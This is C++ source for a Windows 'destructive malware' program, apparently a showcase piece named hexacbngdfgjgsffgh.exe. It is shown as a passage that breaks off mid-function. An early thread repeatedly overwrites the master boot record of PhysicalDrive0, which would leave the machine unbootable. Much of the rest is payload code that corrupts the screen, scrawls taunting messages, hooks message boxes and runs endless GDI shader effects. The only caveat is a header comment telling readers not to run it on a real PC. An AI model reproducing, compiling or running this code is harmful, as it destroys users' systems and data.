// hexacbngdfgjgsffgh.exe by VietNamLover (name by Clutter xmodz).
// This is a destructive malware, don't run it on your real PC!

#include <windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <mmsystem.h>
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#ifndef M_PI
#define M_PI 3.14159265358979323846264338327950288
#endif

using namespace std;
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

// ==================== CUSTOM MBR DATA ====================
unsigned char MasterBootRecord[512] = {
    0x56, 0x49, 0x45, 0x54, 0x4E, 0x41, 0x4D, 0x4C, 0x4F, 0x56, 0x45, 0x52, 0x20, 0x57, 0x41, 0x53,
    0x20, 0x48, 0x45, 0x52, 0x45, 0x20, 0x2D, 0x20, 0x44, 0x45, 0x4C, 0x54, 0x41, 0x2E, 0x45, 0x58,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

void InitDPI() {
    HMODULE h = LoadLibraryA("user32.dll");
    BOOL(WINAPI * SetDPIAware)() = (BOOL(WINAPI*)())GetProcAddress(h, "SetProcessDPIAware");
    if (SetDPIAware) SetDPIAware();
    FreeLibrary(h);
}

int refreshscr() {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    InvalidateRect(NULL, NULL, FALSE);
    BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    ReleaseDC(0, hdc);
    return 207944154;
}

COLORREF BlendPixel(COLORREF bg, COLORREF fg, BYTE alpha) {
    BYTE r = (GetRValue(fg)*alpha + GetRValue(bg)*(255-alpha))/255;
    BYTE g = (GetGValue(fg)*alpha + GetGValue(bg)*(255-alpha))/255;
    BYTE b = (GetBValue(fg)*alpha + GetBValue(bg)*(255-alpha))/255;
    return RGB(r,g,b);
}

COLORREF Hue(int len) {
    static int r=0,g=0,b=0;
    if (r < len) { r++; return RGB(r,0,0); }
    else if (g < len) { g++; return RGB(len,g,0); }
    else if (b < len) { b++; return RGB(0,len,b); }
    else { r=g=b=0; return RGB(0,0,0); }
}

struct Point3D { float x,y,z; };
Point3D RotatePoint(Point3D p, float ax, float ay, float az) {
    float cX=cos(ax), sX=sin(ax), cY=cos(ay), sY=sin(ay), cZ=cos(az), sZ=sin(az);
    float y = p.y*cX - p.z*sX; float z = p.y*sX + p.z*cX; p.y=y; p.z=z;
    float x = p.x*cY + p.z*sY; z = -p.x*sY + p.z*cY; p.x=x; p.z=z;
    x = p.x*cZ - p.y*sZ; y = p.x*sZ + p.y*cZ; p.x=x; p.y=y;
    return p;
}

typedef struct { FLOAT h,s,l; } HSL;

// ==================== MBR WIPER ====================
DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}
namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        FLOAT _r = rgb.rgbRed/255.f, _g = rgb.rgbGreen/255.f, _b = rgb.rgbBlue/255.f;
        FLOAT min = (_r<_g)?_r:_g; min = (min<_b)?min:_b;
        FLOAT max = (_r>_g)?_r:_g; max = (max>_b)?max:_b;
        FLOAT delta = max - min;
        HSL hsl = {0,0,(max+min)/2};
        if (delta) {
            hsl.s = (hsl.l < 0.5f) ? delta/(max+min) : delta/(2.f-max-min);
            FLOAT dr = ((max-_r)/6.f + delta/2.f)/delta;
            FLOAT dg = ((max-_g)/6.f + delta/2.f)/delta;
            FLOAT db = ((max-_b)/6.f + delta/2.f)/delta;
            if (_r == max) hsl.h = db - dg;
            else if (_g == max) hsl.h = 1.f/3.f + dr - db;
            else if (_b == max) hsl.h = 2.f/3.f + dg - dr;
            if (hsl.h < 0) hsl.h += 1; if (hsl.h > 1) hsl.h -= 1;
        }
        return hsl;
    }
    RGBQUAD hsl2rgb(HSL hsl) {
        FLOAT r=hsl.l, g=hsl.l, b=hsl.l;
        FLOAT h=hsl.h, sl=hsl.s, l=hsl.l;
        FLOAT v = (l<=0.5f) ? l*(1+sl) : l+sl-l*sl;
        if (v > 0) {
            FLOAT m = l + l - v;
            FLOAT sv = (v-m)/v;
            h *= 6;
            int sext = (int)h;
            FLOAT fract = h - sext;
            FLOAT vsf = v * sv * fract;
            FLOAT mid1 = m + vsf;
            FLOAT mid2 = v - vsf;
            switch (sext) {
                case 0: r=v; g=mid1; b=m; break;
                case 1: r=mid2; g=v; b=m; break;
                case 2: r=m; g=v; b=mid1; break;
                case 3: r=m; g=mid2; b=v; break;
                case 4: r=mid1; g=m; b=v; break;
                case 5: r=v; g=m; b=mid2; break;
            }
        }
        RGBQUAD q; q.rgbRed=(BYTE)(r*255); q.rgbGreen=(BYTE)(g*255); q.rgbBlue=(BYTE)(b*255); return q;
    }
}

typedef union _RGBQUAD {
    COLORREF rgb;
    struct { BYTE r, g, b, reserved; };
} _RGBQUAD, * PRGBQUAD;

typedef union ColorTemp {
    COLORREF rgb;
    struct { BYTE b,g,r,unused; };
} ColorTemp;

// ---- MsgBox corruption ----
VOID WINAPI MsgBoxCorruptionThread(HWND hwnd) {
    while (true) {
        RECT rc; GetWindowRect(hwnd, &rc);
        int w = rc.right-rc.left, h = rc.bottom-rc.top;
        HDC hdc = GetDC(hwnd), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc,w,h);
        SelectObject(hcdc,bmp);
        BitBlt(hcdc,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0;i<5;i++) {
            HBRUSH br=CreateSolidBrush(RGB(57,197,187));
            HPEN pen=CreatePen(PS_NULL,0,0);
            SelectObject(hcdc,br); SelectObject(hcdc,pen);
            Rectangle(hcdc,0,0,w,h);
            DeleteObject(br); DeleteObject(pen);
            BLENDFUNCTION blur={AC_SRC_OVER,0,5,0};
            GdiAlphaBlend(hdc,0,0,w,h,hcdc,0,0,w,h,blur);
            Sleep(250);
        }
        ReleaseDC(hwnd,hdc); DeleteDC(hcdc); DeleteObject(bmp);
        Sleep(250);
    }
}
LRESULT CALLBACK msgBoxHook(int code, WPARAM w, LPARAM l) {
    if (code == HCBT_ACTIVATE) {
        HWND hwnd=(HWND)w; ShowWindow(hwnd,5);
        CreateThread(0,0,(LPTHREAD_START_ROUTINE)MsgBoxCorruptionThread,hwnd,0,0);
        return 0;
    }
    return CallNextHookEx(0,code,w,l);
}

#define W GetSystemMetrics(0)
#define H GetSystemMetrics(1)
#define RANDC RGB(rand()%256, rand()%256, rand()%256)

DWORD WINAPI spiral(LPVOID) {
    int qi=0;
    while (true) {
        int w=W, h=H;
        LPVOID mem=VirtualAlloc(0,(w*h+w)*sizeof(ColorTemp),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        ColorTemp* data=(ColorTemp*)mem;
        HDC hdc=GetDC(0), memDC=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateBitmap(w,h,1,32,data);
        SelectObject(memDC,bmp);
        BitBlt(memDC,0,0,w,h,hdc,0,0,SRCCOPY);
        GetBitmapBits(bmp,w*h*4,data);
        for (int i=0;i<w*h;i++) {
            int x=i%w - w/2, y=i/w - h/2;
            float angle=atan2((float)y,x)*180/3.14159f;
            float radius=sqrt((float)x*x+y*y);
            int col=(int)(angle*2+radius+qi)%768;
            ColorTemp vortex;
            if (col<256) vortex.r=vortex.g=vortex.b=255-col;
            else if (col<512) vortex.r=vortex.g=vortex.b=0;
            else vortex.r=vortex.g=vortex.b=col-512;
            BYTE alpha=(-32)+(int)(31*sin(radius/25.0f));
            COLORREF res=BlendPixel(RGB(data[i].r,data[i].g,data[i].b), RGB(vortex.r,vortex.g,vortex.b), alpha);
            data[i].r=GetRValue(res); data[i].g=GetGValue(res); data[i].b=GetBValue(res);
        }
        SetBitmapBits(bmp,w*h*4,data);
        BitBlt(hdc,0,0,w,h,memDC,0,0,SRCCOPY);
        ReleaseDC(0,hdc); DeleteDC(memDC); DeleteObject(bmp);
        VirtualFree(mem,0,MEM_RELEASE);
        Sleep(32); qi+=24;
    }
    return 0;
}

DWORD WINAPI thirteen(LPVOID) {
    float ri=2.0893,ro=3.8946,ax=.5,ay=2.0286,bx=1.8099,by=3.4485,cx=1.3855,cy=1.5639,
          dx=3.2052,dy=2.2124,ex=1.9535,ey=.7409,fx=3.8662,fy=.4694,gx=2.0741,gy=.2518,
          hx=3.6415,hy=1.381,ix=1.7195,iy=1.1869,jx=2.5826,jy=2.9152,kx=.9709,ky=1.85,
          lx=.932,ly=3.7814;
    while (true) {
        HDC hdc=GetDC(0);
        int w=W, h=H;
        int x=rand()%w, y=rand()%h, z=1+rand()%128, m=rand()%256,n=rand()%256,o=rand()%256;
        POINT pt[26] = { (LONG)x, (LONG)(y+(ro*z)), (LONG)(x-(ax*z)), (LONG)(y+(ay*z)),
                         (LONG)(x-(bx*z)), (LONG)(y+(by*z)), (LONG)(x-(cx*z)), (LONG)(y+(cy*z)),
                         (LONG)(x-(dx*z)), (LONG)(y+(dy*z)), (LONG)(x-(ex*z)), (LONG)(y+(ey*z)),
                         (LONG)(x-(fx*z)), (LONG)(y+(fy*z)), (LONG)(x-(gx*z)), (LONG)(y-(gy*z)),
                         (LONG)(x-(hx*z)), (LONG)(y-(hy*z)), (LONG)(x-(ix*z)), (LONG)(y-(iy*z)),
                         (LONG)(x-(jx*z)), (LONG)(y-(jy*z)), (LONG)(x-(kx*z)), (LONG)(y-(ky*z)),
                         (LONG)(x-(lx*z)), (LONG)(y-(ly*z)), (LONG)x, (LONG)(y-(ri*z)),
                         (LONG)(x+(lx*z)), (LONG)(y-(ly*z)), (LONG)(x+(kx*z)), (LONG)(y-(ky*z)),
                         (LONG)(x+(jx*z)), (LONG)(y-(jy*z)), (LONG)(x+(ix*z)), (LONG)(y-(iy*z)),
                         (LONG)(x+(hx*z)), (LONG)(y-(hy*z)), (LONG)(x+(gx*z)), (LONG)(y-(gy*z)),
                         (LONG)(x+(fx*z)), (LONG)(y+(fy*z)), (LONG)(x+(ex*z)), (LONG)(y+(ey*z)),
                         (LONG)(x+(dx*z)), (LONG)(y+(dy*z)), (LONG)(x+(cx*z)), (LONG)(y+(cy*z)),
                         (LONG)(x+(bx*z)), (LONG)(y+(by*z)), (LONG)(x+(ax*z)), (LONG)(y+(ay*z)) };
        HBRUSH br=CreateSolidBrush(RGB(m,n,o));
        HPEN pen=CreatePen(PS_NULL,0,0);
        SelectObject(hdc,br); SelectObject(hdc,pen);
        Polygon(hdc,pt,26);
        DeleteObject(br); DeleteObject(pen);
        ReleaseDC(0,hdc);
        Sleep(8);
    }
    return 0;
}

DWORD WINAPI gradient(LPVOID) {
    while (true) {
        HDC hdc=GetDC(0);
        int w=W, h=H;
        int rr[4]={0x3900,0x4a00,0x2500,0}, gg[4]={0xc500,0xff00,0x8000,0xc400}, bb[4]={0xbb00,0xf200,0x7900,0xb700};
        int a=rand()%4, b=rand()%4;
        TRIVERTEX vtx[2];
        vtx[0].x=rand()%w; vtx[0].y=rand()%h;
        vtx[1].x=rand()%w; vtx[1].y=rand()%h;
        vtx[0].Red=rr[a]; vtx[0].Green=gg[a]; vtx[0].Blue=bb[a]; vtx[0].Alpha=0xff00;
        vtx[1].Red=rr[b]; vtx[1].Green=gg[b]; vtx[1].Blue=bb[b]; vtx[1].Alpha=0xff00;
        GRADIENT_RECT rc={0,1};
        DWORD mode[4]={GRADIENT_FILL_RECT_H,GRADIENT_FILL_RECT_V,GRADIENT_FILL_TRIANGLE,GRADIENT_FILL_OP_FLAG};
        HRGN rgn=CreateEllipticRgn(vtx[0].x,vtx[0].y,vtx[1].x,vtx[1].y);
        SelectClipRgn(hdc,rgn);
        GradientFill(hdc,vtx,2,&rc,1,mode[rand()%4]);
        DeleteObject(rgn);
        ReleaseDC(0,hdc);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI text(LPVOID) {
    int clr[4]={57,74,37,0}, clg[4]={197,255,128,196}, clb[4]={187,242,121,183};
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), hcdc=CreateCompatibleDC(hdc);
        int a = (w>h) ? rand()%(h/10) : rand()%(w/10);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(hcdc,bmp);
        BitBlt(hcdc,0,0,w,h,hdc,0,0,SRCCOPY);
        SetBkMode(hcdc,1);
        LPCSTR texts[5]={"THERE IS NO ESCAPE!","VIETNAMLOVER IS HERE TO DESTROY THIS COMPUTER!","R.I.P SYSTEM!","hexacbngdfgjgsffgh.exe","SAY GOODBYE TO YOUR PC NOW!"};
        int tmp=rand()%5, b=rand()%4;
        SetTextColor(hcdc, RGB(clr[b],clg[b],clg[b]));
        HFONT font=CreateFont(a,a/2,rand()%3600,rand()%3600,rand()%901,0,0,0,ANSI_CHARSET,OUT_CHARACTER_PRECIS,CLIP_CHARACTER_PRECIS,rand()%5,(rand()%5<<4),"114514");
        SelectObject(hcdc,font);
        TextOutA(hcdc,rand()%w,rand()%h,texts[tmp],strlen(texts[tmp]));
        BitBlt(hdc,0,0,w,h,hcdc,0,0,SRCCOPY);
        DeleteObject(font); DeleteObject(bmp); DeleteDC(hcdc);
        ReleaseDC(0,hdc);
        Sleep(5);
    }
    return 0;
}

DWORD WINAPI shader1(LPVOID) {
    HDC hdc=GetDC(0), memDC=CreateCompatibleDC(hdc);
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(memDC,bmp);
    while (true) {
        hdc = GetDC(0);
        BitBlt(memDC,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++)
            data[i].rgb = (data[i].rgb * 2) % RGB(255,255,255);
        BitBlt(hdc,0,0,w,h,memDC,0,0,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI rgb(LPVOID) {
    int w=W, h=H;
    void* bits=VirtualAlloc(0,4*w*(h+1),0x3000,4);
    DWORD start=GetTickCount();
    while (true) {
        HDC hdc=GetDC(0), src=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateBitmap(w,h,1,32,bits);
        SelectObject(src,bmp);
        BitBlt(src,0,0,w,h,hdc,0,0,0xCC0020);
        GetBitmapBits(bmp,4*w*h,bits);
        int v=0;
        if (GetTickCount()-start > 10) rand();
        for (int j=0; j<w*h; j++) {
            if (!(j%h) && !(rand()%110)) v=rand()%24;
            *((BYTE*)bits + 4*j + v) -= 5;
        }
        SetBitmapBits(bmp,4*w*h,bits);
        BitBlt(hdc,0,0,w,h,src,0,0,0xCC0020);
        DeleteObject(bmp); DeleteDC(src);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI movescr(LPVOID) {
    int w=W, h=H;
    while (true) {
        HDC hdc=GetDC(0);
        HBRUSH br=CreateSolidBrush(RANDC);
        SelectObject(hdc,br);
        DWORD rop[3]={SRCCOPY,NOTSRCCOPY,PATINVERT};
        BitBlt(hdc,(rand()%3-1)*(rand()%3)*(rand()%3+1), (rand()%3-1)*(rand()%3)*(rand()%3+1), w,h,hdc,0,0,rop[rand()%3]);
        DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID) {
    int w=W, h=H, start=GetTickCount();
    _RGBQUAD* data=(_RGBQUAD*)VirtualAlloc(0,(w*h+w)*sizeof(_RGBQUAD),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    while (true) {
        HDC desk=GetDC(0), mem=CreateCompatibleDC(desk);
        HBITMAP bmp=CreateBitmap(w,h,1,32,data);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,desk,0,0,SRCCOPY);
        GetBitmapBits(bmp,w*h*4,data);
        int v=0;
        if (GetTickCount()-start > 60000) rand()%0xff;
        for (int i=0;i<w*h;i++) {
            int x=i%w, y=i/w;
            if (!(i%h) && !(rand()%110)) v=rand()%24;
            *((BYTE*)data + 4*i + v) += x & y;
        }
        SetBitmapBits(bmp,w*h*4,data);
        BitBlt(desk,0,0,w,h,mem,0,0,SRCCOPY);
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,desk);
    }
    return 0;
}

DWORD WINAPI drawtancotfunctionicon(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        int a=(h/2)-rand()%h, b=(20000/h)+rand()%(2000/h), c=rand()%w, d=rand()%h, e=1+rand()%32, f=10+rand()%55;
        HPEN pen=CreatePen(PS_NULL,0,0); SelectObject(hdc,pen);
        HBRUSH br=CreateSolidBrush(RANDC); SelectObject(hdc,br);
        if (a != 0 && b != 0) {
            for (int x=0; x<=w; x += e) {
                double val = a * tan((b/80.0)*(x*M_PI/180)+(c/8.0)) + d;
                Ellipse(hdc,x,val,x+f,val+f);
                LineTo(hdc,x+f/2,val+f/2);
            }
            for (int y=0; y<=h; y += e) {
                double val = (atan((double)(y-d)/a) - (c/8.0)) / (b/80.0) * 40/M_PI;
                Ellipse(hdc,val,y,val+f,y+f);
            }
        }
        DeleteObject(pen); DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI drawinverseproportionalfunctionicon(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        int a=124-rand()%250, b=rand()%h, c=rand()%h, d=1+rand()%15, e=1+rand()%32;
        if (a != 0) {
            for (int x=0; x<=w; x+=e) if (x != b)
                DrawIcon(hdc, x, -(a*5000/(x-b))+c, LoadCursor(GetModuleHandle(0), MAKEINTRESOURCE(d)));
            for (int y=0; y<=h; y+=e) if (y != c)
                DrawIcon(hdc, -(a*5000/(y-c))+b, y, LoadCursor(GetModuleHandle(0), MAKEINTRESOURCE(d)));
        }
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI manyicon(LPVOID) {
    HINSTANCE libs[]={LoadLibrary("Shell32.dll"),LoadLibrary("Imageres.dll"),LoadLibrary("Moricons.dll"),LoadLibrary("Pifmgr.dll")};
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0);
        HICON icons[9]={ LoadIcon(libs[0],MAKEINTRESOURCE(1+rand()%336)), LoadIcon(libs[1],MAKEINTRESOURCE(1+rand()%365)),
                         LoadIcon(0,MAKEINTRESOURCE(32512+rand()%7)), LoadIcon(libs[2],MAKEINTRESOURCE(1+rand()%38)),
                         LoadIcon(libs[3],MAKEINTRESOURCE(1+rand()%113)), LoadCursor(0,MAKEINTRESOURCE(101+rand()%18)),
                         LoadCursor(0,MAKEINTRESOURCE(32640+rand()%30)), LoadCursor(0,MAKEINTRESOURCE(32512*rand()%5)),
                         LoadCursor(0,MAKEINTRESOURCE(32631)) };
        DrawIconEx(hdc,rand()%w,rand()%h,icons[rand()%9],96,96,0,0,DI_NORMAL);
        DrawIconEx(hdc,rand()%w,rand()%h,icons[rand()%9],96,96,0,0,DI_NORMAL);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float ax, float ay, float az) {
    Point3D v[8] = {{-size,-size,-size},{size,-size,-size},{size,size,-size},{-size,size,-size},
                    {-size,-size,size},{size,-size,size},{size,size,size},{-size,size,size}};
    POINT p[8];
    for (int i=0;i<8;i++) { Point3D r=RotatePoint(v[i],ax,ay,az); p[i].x=(LONG)(center.x+r.x); p[i].y=(LONG)(center.y+r.y); }
    HPEN pen=CreatePen(PS_SOLID,1,0); HBRUSH br=CreateSolidBrush(RGB(0,255,255));
    SelectObject(hdc,pen); SelectObject(hdc,br);
    Polygon(hdc,p,4);
    DeleteObject(pen); DeleteObject(br);
}

DWORD WINAPI cube(LPVOID) {
    int w=W, h=H, sx=1, sy=1;
    float x2=100, y2=100, ax=0, ay=0, az=0, size=100;
    while (true) {
        HDC hdc=GetDC(0);
        x2 += 10*sx; y2 += 10*sy;
        if (x2+75 >= w) { sx=-1; x2=w-76; } else if (x2 <= 75) { sx=1; x2=76; }
        if (y2+75 >= h) { sy=-1; y2=h-76; } else if (y2 <= 75) { sy=1; y2=76; }
        Draw3DCube(hdc,{x2,y2,0},size,ax,ay,az);
        ReleaseDC(0,hdc);
        ax+=0.04; ay+=0.04; az+=0.04;
        Sleep(10);
        if (size < 100) size += 0.5;
    }
    return 0;
}

DWORD WINAPI text2(LPVOID) {
    int w=W, h=H;
    HDC hdc=GetDC(0);
    LPCWSTR txt=L"hexacbngdfgjgsffgh.exe";
    while (true) {
        for (int x=0; x<=w; x+=186)
            for (int y=0; y<=h; y+=64) {
                for (int dx=0; dx<2; dx++)
                    for (int dy=0; dy<4; dy++) {
                        SetTextColor(hdc,RANDC); SetBkColor(hdc,RANDC);
                        TextOutW(hdc,(x+93*dx),(y+16*dy),txt,wcslen(txt));
                    }
                Sleep(1);
            }
    }
    return 0;
}

DWORD WINAPI shader3(LPVOID) {
    int w=W, h=H;
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    BITMAPINFO bmpi={0}; bmpi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmpi.bmiHeader.biWidth=w; bmpi.bmiHeader.biHeight=h;
    bmpi.bmiHeader.biPlanes=1; bmpi.bmiHeader.biBitCount=32;
    bmpi.bmiHeader.biCompression=BI_RGB;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    int i=0;
    while (true) {
        hdc = GetDC(0);
        StretchBlt(mem,0,0,w,h,hdc,0,0,w,h,SRCCOPY);
        for (int x=0; x<w; x++) for (int y=0; y<h; y++) {
            int idx = y*w + x;
            int fx = (x & (i*4)) * (y | (i*4));
            RGBQUAD tmp;
            tmp.rgbRed = data[idx].r;
            tmp.rgbGreen = data[idx].g;
            tmp.rgbBlue = data[idx].b;
            HSL hsl = Colors::rgb2hsl(tmp);
            hsl.h = fmod(fx/300.f + y/(float)h*0.1f + i/1000.f, 1.f);
            hsl.s = 0.7f; hsl.l = 0.5f;
            RGBQUAD res = Colors::hsl2rgb(hsl);
            data[idx].r = res.rgbRed;
            data[idx].g = res.rgbGreen;
			data[idx].b = res.rgbBlue;
        }
        i++;
        StretchBlt(hdc,0,0,w,h,mem,0,0,w,h,SRCCOPY);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI last(LPVOID) {
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&data, 0, 0);
    SelectObject(mem,bmp);
    while (true) {
        hdc = GetDC(0);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<w*h; i++) data[i].rgb = rand();
        BitBlt(hdc,-2,2,w,h,mem,4,4,SRCCOPY);
        ReleaseDC(0,hdc);
        Sleep(10);
    }
    return 0;
}

VOID ci(HDC hdc, int x,int y,int w,int h) {
    HRGN rgn=CreateEllipticRgn(x,y,x+w,y+h);
    SelectClipRgn(hdc,rgn);
    HBRUSH br=CreateSolidBrush(RANDC);
    SelectObject(hdc,br);
    Rectangle(hdc,x,y,x+w,y+h);
    DeleteObject(rgn); DeleteObject(br);
}

DWORD WINAPI transparent(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        int b=rand()%11, size=b*100;
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        int x=rand()%(w+size)-size/2, y=rand()%(h+size)-size/2;
        BLENDFUNCTION blur={AC_SRC_OVER,0,64,0};
        for (int i=0; i<size; i+=100) {
            ci(mem,x-i/2,y-i/2,i,i);
            GdiAlphaBlend(hdc,0,0,w,h,mem,0,0,w,h,blur);
            Sleep(10);
        }
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI shader4(LPVOID) {
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=-h;
    bmi.bmiHeader.biPlanes=1; bmi.bmiHeader.biBitCount=32;
    bmi.bmiHeader.biCompression=BI_RGB;
    _RGBQUAD* data = NULL;
    for (int i=0;;i++) {
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&data, 0, 0);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int y=0; y<h; y++) for (int x=0; x<w; x++) {
            int idx = x ^ y * w;
            BYTE fr = (x|y) + i*8, fg = (x&y)*i*8, fb = (x^y)^(i*8);
            data[idx].r = (BYTE)(0.5*data[idx].r + 0.5*fr);
            data[idx].g = (BYTE)(0.5*data[idx].g + 0.5*fg);
            data[idx].b = (BYTE)(0.5*data[idx].b + 0.5*fb);
            data[idx].r = (BYTE)(data[idx].r * 0.8);
            data[idx].g = (BYTE)(data[idx].g * 0.8);
            data[idx].b = (BYTE)(data[idx].b * 0.8);
            data[idx].r = (BYTE)(0.3*fb + 0.6*fg);
            data[idx].g = (BYTE)(0.3*fr + 0.6*fb);
            data[idx].b = (BYTE)(0.3*fg + 0.6*fr);
        }
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
    }
    return 0;
}

DWORD WINAPI silie2(LPVOID) {
    int sw=W, sh=H;
    while (true) {
        HDC hdc=GetDC(0);
        int ry=rand()%sh;
        HBRUSH br=CreateSolidBrush(RANDC); SelectObject(hdc,br);
        BitBlt(hdc,10,ry,sw,96,hdc,0,ry,(DWORD)0x1900ac010e);
        BitBlt(hdc,-10,ry,sw,-96,hdc,0,ry,(DWORD)0x1900ac010e);
        DeleteObject(br);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI silie(LPVOID) {
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,SRCCOPY);
        for (int i=0; i<h; i+=20) StretchBlt(mem,rand()%20,i,w,20,mem,rand()%20,i,w,20,SRCCOPY);
        BitBlt(hdc,0,0,w,h,mem,0,0,SRCCOPY);
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI shader5(LPVOID) {
    BLENDFUNCTION blur={AC_SRC_OVER,0,50,0};
    while (true) {
        int w=W, h=H;
        HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
        HBITMAP bmp=CreateCompatibleBitmap(hdc,w,h);
        SelectObject(mem,bmp);
        BitBlt(mem,0,0,w,h,hdc,0,0,NOTSRCCOPY);
        for (int y=0;y<h;y+=20) StretchBlt(mem,-5+rand()%11,y,w,20,mem,0,y,w,20,NOTSRCCOPY);
        for (int x=0;x<w;x+=20) StretchBlt(mem,x,-5+rand()%11,20,h,mem,x,0,20,h,NOTSRCCOPY);
        double angle=0;
        for (float i=0;i<w;i+=0.99f) { BitBlt(mem,(int)i,0,1,h,mem,(int)i,(int)(sin(angle)*20),NOTSRCCOPY); angle+=M_PI/40; }
        for (float i=0;i<h;i+=0.99f) { BitBlt(mem,0,(int)i,w,1,mem,(int)(cos(angle)*24),(int)i,NOTSRCCOPY); angle+=M_PI/40; }
        GdiAlphaBlend(hdc,0,0,w,h,mem,0,0,w,h,blur);
        DeleteObject(bmp); DeleteDC(mem);
        ReleaseDC(0,hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI shader6(LPVOID) {
    HDC hdc=GetDC(0), mem=CreateCompatibleDC(hdc);
    int w=W, h=H;
    BITMAPINFO bmi={0}; bmi.bmiHeader.biSize=sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount=32; bmi.bmiHeader.biPlanes=1;
    bmi.bmiHeader.biWidth=w; bmi.bmiHeader.biHeight=h;
    _RGBQUAD* data = NULL;
